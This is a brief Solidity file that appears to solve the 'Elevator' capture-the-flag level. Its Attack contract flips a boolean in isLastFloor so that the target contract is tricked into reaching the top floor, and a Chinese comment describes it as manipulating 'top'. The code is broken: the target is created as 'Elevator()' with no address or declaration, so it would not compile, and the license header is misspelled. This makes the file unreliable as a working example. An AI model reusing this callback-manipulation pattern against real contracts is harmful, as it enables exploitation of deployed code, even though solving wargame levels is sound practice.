// SPXD-License-Identifier: MIT
pragma solidity ^0.8.13;


contract Attack {
    
    bool top = true;

    function isLastFloor(uint _floor) public returns(bool) {

        top = !top;
        return top;
    }

    function attack() public {
        
        Elevator elvator = Elevator();
        elvator.goTo(1);

    }
}

/**
 * 写一个合约操纵top
 */